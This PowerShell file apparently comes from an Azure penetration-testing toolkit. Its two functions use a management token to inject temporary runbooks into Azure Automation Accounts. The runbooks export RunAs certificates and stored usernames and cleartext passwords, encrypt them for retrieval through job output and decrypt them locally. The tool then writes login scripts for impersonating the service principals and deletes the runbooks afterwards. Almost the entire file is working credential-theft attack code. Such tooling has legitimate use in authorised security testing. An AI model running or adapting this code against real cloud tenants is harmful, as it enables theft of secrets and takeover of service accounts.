Function Get-AzAutomationAccountCredsREST {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription ID")]
        [string]$SubscriptionId,

        [Parameter(Mandatory=$false,
        HelpMessage="The management scoped token")]
        [string]$managementToken,

        [parameter(Mandatory=$false,
        HelpMessage="Password to use for exporting the Automation certificates.")]
        [String]$CertificatePassword = "TotallyNotaHardcodedPassword..."

    )

    if ($SubscriptionId -eq ''){

        # List all subscriptions for a tenant
        $subscriptions = ((Invoke-WebRequest -Uri ('https://management.azure.com/subscriptions?api-version=2019-11-01') -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value

        # Select which subscriptions to dump info for
        $subChoice = $subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        if($subChoice.count -eq 0){Write-Verbose 'No subscriptions selected, exiting'; break}

    }
    else{$subChoice = $SubscriptionId; $noLoop = 1}

    $SubscriptionId = $subChoice.subscriptionId

    $subName = $subChoice.displayName
    
    $automationAccounts = ((Invoke-WebRequest -uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/providers/Microsoft.Automation/automationAccounts?api-version=2015-10-31") ) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value
    
      $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("Type") | Out-Null
    $TempTblCreds.Columns.Add("Name") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Value") | Out-Null
    $TempTblCreds.Columns.Add("PublishURL") | Out-Null
    $TempTblCreds.Columns.Add("Created") | Out-Null
    $TempTblCreds.Columns.Add("Updated") | Out-Null
    $TempTblCreds.Columns.Add("Enabled") | Out-Null
    $TempTblCreds.Columns.Add("Content Type") | Out-Null
    $TempTblCreds.Columns.Add("Vault") | Out-Null
    $TempTblCreds.Columns.Add("Subscription") | Out-Null
    
  

    # Get Cert path from 
    $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst

    if ($cert -eq $null){
        # Create new Cert
        New-SelfSignedCertificate -DnsName microburst -CertStoreLocation "Cert:\CurrentUser\My" -KeyUsage KeyEncipherment,DataEncipherment, KeyAgreement -Type DocumentEncryptionCert | Out-Null
         # Get Cert path from 
        $cert = Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert -DnsName microburst
    }

    # Export to cer
    Export-Certificate -Cert $cert -FilePath .\microburst.cer | Out-Null
    
    # Cast Cert file to B64
    $ENCbase64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(-join($pwd,"\microburst.cer")))

    $jobList = $null
        
    foreach($account in $automationAccounts)
    {
        $verboseName = $account.name
        $resourceGroup = $account.id.split("/")[4]
        $connections = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value
        foreach($conn in $connections){

            $connection = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/connections/",$conn.name,"?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content)
                        
            #Need to use Select-Object here for some reason, otherwise it only returns the first field
            $properties = (($connection | ConvertFrom-Json).properties)
            
            $autoConnectionName = ($connection | ConvertFrom-Json).name
            $autoConnectionThumbprint = $properties.fieldDefinitionValues.CertificateThumbPrint
            $autoConnectionTenantId = $properties.fieldDefinitionValues.TenantId
            $autoConnectionApplicationId = $properties.fieldDefinitionValues.ApplicationId
            $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
            "`$RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'" | Out-File -FilePath "$pwd\$jobName.ps1" 
            "`$CertificatePath = Join-Path `$env:temp $verboseName-AzureRunAsCertificate.pfx" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "`$Cert = `$RunAsCert.Export('pfx','$CertificatePassword')" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "Set-Content -Value `$Cert -Path `$CertificatePath -Force -Encoding Byte | Write-Verbose " | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

            # Encrypt the passwords in the Automation account output
            "`$encryptedOut = (`$base64string | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName.ps1" -Append

            # Write the output to the log
            "Write-Output `$encryptedOut" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            # Cast Name for runas scripts for each connection
            $runAsName = -join($verboseName,'-',$autoConnectionName)

            "`$thumbprint = '$autoConnectionThumbprint'"| Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1"
            "`$tenantID = '$autoConnectionTenantId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append                                               
            "`$appId = '$autoConnectionApplicationId'" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
            
            "`$SecureCertificatePassword = ConvertTo-SecureString -String $CertificatePassword -AsPlainText -Force" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
            "Import-PfxCertificate -FilePath .\$runAsName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
            "Add-AzAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$runAsName.ps1" -Append
            if($jobList){
                    $jobList += @(@($jobName,$runAsName))
                }
                else{
                    $jobList = @(@($jobName,$runAsName))
                }
            
        }



        $credentials = ((Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/credentials?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content | ConvertFrom-Json).value


        foreach($cred in $credentials)
        {
            $cred = (Invoke-WebRequest -Uri (-join ("https://management.azure.com/subscriptions/",$SubscriptionId,"/resourceGroups/",$resourceGroup,"/providers/Microsoft.Automation/automationAccounts/",$account.name,"/credentials/",$cred.name,"?api-version=2015-10-31")) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).content
            #Write-Verbose $cred
             # If other creds are available, get the credentials from the runbook
            if ($cred -ne $null){
                # foreach credential in autocred, create a new file, add the name to the list
                foreach ($subCred in $cred){
                    # Set Random names for the runbooks. Prevents conflict issues
                    $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                    #Write-Output $subCred | ConvertFrom-Json
                    # Write Script to local file
                    $credName = ($subCred | ConvertFrom-Json).name

                    "`$myCredential = Get-AutomationPSCredential -Name '$credName'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
                    "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Copy the B64 encryption cert to the Automation Account host
                    "`$FileName = `"C:\Temp\microburst.cer`"" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "[IO.File]::WriteAllBytes(`$FileName, [Convert]::FromBase64String(`"$ENCbase64string`"))" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "Import-Certificate -FilePath `"c:\Temp\microburst.cer`" -CertStoreLocation `"Cert:\CurrentUser\My`" | Out-Null" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Encrypt the passwords in the Automation account output
                    "`$encryptedOut1 = (`$userName | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "`$encryptedOut2 = (`$password | Protect-CmsMessage -To cn=microburst)" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    # Write the output to the log
                    "Write-Output `$encryptedOut1" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "Write-Output ','" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "Write-Output `$encryptedOut2" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append

                    $jobList2 += @($jobName2)
                }
            }
        }  
        
        
        

        #Start executing runbooks
        
        if ($jobList.Count -ne $null){
                $connectionIter = 0
            
                while ($connectionIter -lt ($jobList.Count)){
                    $jobName = $jobList[$connectionIter]
                    $runAsName = $jobList[$connectionIter+1]

                    $connectionIter += 2

                    Write-Output "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                    try{
                           
                        $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobName.ps1 -resourceGroupId $account.id.split("/")[4] -region $account.location
                        
                        # if execution errors, delete the AuthenticateAs- ps1 file
                        if($jobOutput.Exception){
                            Write-Verbose "`t`tNo available certificate for the connection"
                            Remove-Item -Path (Join-Path $pwd "AuthenticateAs-$runAsName.ps1") | Out-Null                            
                        }
                        # Else write it to a local file
                        else{

                            $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
                            # Decrypt the output and write the pfx file
                            [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput | Unprotect-CmsMessage)))

                            $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
                            Write-Output $instructionsMSG                        
                        }

                        # clean up
                        Write-Output "`t`tRemoving $jobName runbook from $verboseName Automation Account"
                        
                    }
                    Catch{
                    Write-Output "`tUser does not have permissions to import Runbook"
                    Write-Output $_
                    }

                    #Clean up local temp files
                    Remove-Item -Path $pwd\$jobName.ps1 | Out-Null

                    
                }
            }
            
            
            # If there's cleartext credentials, run the second runbook
            if ($cred -ne $null){
                
                $cred = $cred | ConvertFrom-Json
                                   
                Write-Output "`tGetting cleartext credentials for the $verboseName Automation Account"
                foreach ($jobToRun in $jobList2){
                    # If the additional runbooks didn't write, don't run them
                    if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
                        
                        try{
                        
                            Write-Output "`t`tGetting cleartext credentials for $subName using the $jobToRun.ps1 Runbook"             

                            $jobOutput = Invoke-AzRunbook -subscriptionId $SubscriptionId -managementToken $managementToken -automationAccount $account.name -targetScript $pwd\$jobToRun.ps1 -resourceGroupId $account.id.split("/")[4] -region $account.location
                            # If there was an actual cred here, get the output and add it to the table                    
                            
                            #Kinda a hack. Should loop back around to this.
                            $jobOutput = $jobOutput.split(",")                        
                            # Might be able to delete this line...
                                
                            # Decrypt the output and add it to the table
                            $cred1 = ($jobOutput[0] | Unprotect-CmsMessage)
                            $cred2 = ($jobOutput[1] | Unprotect-CmsMessage)
                                
                            $TempTblCreds.Rows.Add("Azure Automation Account",$verboseName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null

                            Write-Output "`t`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
                        }
                        Catch{
                        Write-Verbose "`tUser does not have permissions to import Runbook"
                        Write-Verbose $_
                        }
                        
                        # Clean up local temp files
                        Remove-Item -Path $pwd\$jobToRun.ps1 | Out-Null
                    }
                }
            }
        }
    Write-Output $TempTblCreds
    }
    


#This function will run a local PowerShell script in a designated Automation Account. A new Runbook draft will be created, published, ran, and deleted. A job will persist in the "Jobs" tab.
Function Invoke-AzRunbook {
    [CmdletBinding()]
    Param(

    [Parameter(Mandatory=$true,
    HelpMessage="The management scoped token")]
    [string]$managementToken,
        

    [Parameter(Mandatory=$true,
    HelpMessage="The target automation account")]
    [string]$automationAccount,

    [Parameter(Mandatory=$true,
    HelpMessage="The region that the account is in")]
    [string]$region,

    [Parameter(Mandatory=$false,
    HelpMessage="The name of the runbook. Defaults to random.")]
    [string]$runbookName,

    [Parameter(Mandatory=$true,
    HelpMessage="The subscription id where the automation account is located")]
    [string]$subscriptionId,
       
    [Parameter(Mandatory=$true,
    HelpMessage="The resource group where the automation account is located")]
    [string]$resourceGroupId,

    [Parameter(Mandatory=$true,
     HelpMessage="The script you'd like to run")]
    [string]$targetScript
        )
        

    if($runbookName -eq '') {$runbookName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})}

    Write-Verbose (-join ("Name of runbook: ",$runbookName))
          
    #If we create a draft we can input the content directly instead of needing to host a file.
    Write-Verbose "Creating draft runbook..."
    $draftBody = -join ('{"properties":{"runbookType":"PowerShell","draft":{}},"name":"',$runbookName,'","location":"', $region, '"}')
    $createDraft= ((Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'?api-version=2015-10-31')) -Verbose:$false -ContentType "application/json" -Method PUT -Body $draftBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content | ConvertFrom-Json).value
    
    Write-Verbose "Replacing script content..."
    $editDraftBody = Get-Content $targetScript -Raw
    $editDraft = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'/draft/content?api-version=2015-10-31')) -Verbose:$false -ContentType "text/powershell" -Method PUT -Body $editDraftBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
        
    Write-Verbose "Publishing draft..."
    $publishDraft = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'/draft/publish?api-version=2015-10-31')) -Verbose:$false -Method POST -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
        
    $jobBody = -join ('{"properties":{"runbook":{"name":"',$runbookName,'"},"runOn":""}}')

    $jobGUID = [GUID]::NewGuid().ToString()
        
    Write-Verbose "Starting job..."        
        
    $startJob = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/jobs/',$jobGUID,'?api-version=2015-10-31')) -Verbose:$false -ContentType "application/json" -Method PUT -Body $jobBody -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
        
    $jobsResults = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/jobs/',$jobGUID,'/output?api-version=2015-10-31')) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing)
        
    if($jobsResults.RawContentLength -ne 0) {$isDone = $false}
    else
    {
        $isDone = $true
        Write-Verbose "Looping until job completes..."
        while($isDone){
            #Don't want to spam the API
            Start-Sleep 5
            $jobsResults = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/jobs/',$jobGUID,'/output?api-version=2015-10-31')) -Verbose:$false -Method GET -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing)
            if($jobsResults.RawContentLength -ne 0){$isDone = $false}
        }
    }

    Write-Verbose "Got job output!"
    Write-Verbose $jobsResults.Content
     
    Write-Verbose "Deleting runbook"
    $deleteRunbook = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subscriptionId,'/resourceGroups/',$resourceGroupId,'/providers/Microsoft.Automation/automationAccounts/',$automationAccount,'/runbooks/',$runbookName,'?api-version=2015-10-31')) -Verbose:$false -Method DELETE -Headers @{ Authorization ="Bearer $managementToken"} -UseBasicParsing).Content
            
    return $jobsResults.Content
}

 
